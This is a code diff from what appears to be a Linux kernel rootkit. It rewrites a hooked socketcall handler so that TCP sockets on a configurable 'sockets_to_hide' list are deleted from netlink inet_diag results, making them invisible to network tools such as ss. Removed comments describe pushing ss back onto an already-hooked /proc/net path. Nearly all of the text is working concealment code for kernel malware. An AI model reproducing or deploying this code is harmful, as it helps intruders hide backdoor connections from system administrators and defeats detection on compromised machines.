@@ -131,40 +131,30 @@ static int hooked_tcp_show(struct seq_file* file, void* v){
 
 static int checkport(struct nlmsghdr *nlh){
     struct inet_diag_msg *r = NLMSG_DATA(nlh);
-    //struct tcpstat s;
-    //s.state = r->idiag_state;
-    //s.local.family = s.remote.family = r->idiag_family;
-	//s.lport = ntohs(r->id.idiag_sport);
-	//s.rport = ntohs(r->id.idiag_dport);
     int lport = ntohs(r->id.idiag_sport);
-    int rport = ntohs(r->id.idiag_dport);
-    //printk(KERN_ALERT "[Rootkit] lport %d, rport %d\n", lport, rport);
-    return lport == 25;
+    struct l_socket_to_hide* socket;
+    struct list_head* cur;
+    list_for_each(cur, &sockets_to_hide){
+        socket = list_entry(cur, struct l_socket_to_hide, list);
+        if (lport == socket->port && socket->prot == OUR_PROT_TCP){
+            return 1;
+        } 
+    }
+    return 0;
 }
 
 asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
-    // when a socket gets opened with exaclty the arguments which ss uses, return -1
-    // returning -1 causes ss to try it via /proc/net, which we already hooked
-    //struct msghdr* msg = (void*)&(((unsigned int*)args)[1]);
-    //struct iovec* iov = msg->msg_iov;
-    //char *buf = iov->iov_base;
-    //struct nlmsghdr* h = (struct nlmsghdr*)buf;
-
     long retval;
-    long status; // this is just for consistence with varnames of "ss"
-    // struct msghdr* msg = (struct msghdr*)&(((unsigned int*)args)[1]);
+    long status; // bytes remaining until end of result
     struct msghdr* msg;
     struct nlmsghdr* h;
     __kernel_size_t numblocks;
     struct inet_diag_msg *r;
-    int err;
-    struct nlmsgerr *nlmsg_err;
     char* previous;
     char* currhdr;
     int i;
     int found=0;
-    int step=0;
-
+    // here the actual work for the recvmsg system call
     if(call == SYS_RECVMSG){
         // retrieve data structures
         msg = (struct msghdr*)(((int*)args)[1]);
@@ -175,18 +165,16 @@ asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
         retval = orig_socketcall(call, args);
         // status holds the bytes remaining
         status = retval;
-
+        // now, we remove the sockets to be hidden from the result...
+        found = 0;
         previous = NLMSG_DATA(h);
         while (NLMSG_OK(h, status)) {
-            printk(KERN_ALERT "step %d\n", step++);
-            currhdr = (char*)h;
-
             if (found == 0){
                 h = NLMSG_NEXT(h, status);
             }
+            currhdr = (char*)h;
             if (checkport(h)){
                 found = 1;
-                printk(KERN_ALERT "Port 25. Doing stuff.\n");
                 for (i=0; i<status; ++i){
                     // "NLMSG_ALIGN((nlh)->nlmsg_len)" computes the length of the nlmsghdr nlh in bytes.
                     currhdr[i] = currhdr[i + NLMSG_ALIGN((h)->nlmsg_len)];
